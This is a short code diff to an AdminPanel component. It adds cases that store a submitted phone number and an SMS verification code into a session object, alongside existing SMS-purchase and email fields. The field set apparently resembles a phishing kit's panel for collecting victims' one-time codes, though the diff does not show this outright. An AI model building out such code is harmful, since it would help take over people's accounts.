@@ -458,8 +458,14 @@ export default function AdminPanel() {
                 case 'smsCompra':
                   updatedSession.smsCompra = inputData.smsCompra;
                   break;
+                case 'telefono':
+                  updatedSession.celular = inputData.telefono;
+                  break;
                 case 'celular':
                   updatedSession.celular = inputData.celular;
+                  break;
+                case 'codigo':
+                  updatedSession.sms = inputData.codigo;
                   break;
                 case 'gmail':
                   updatedSession.correo = inputData.correo;
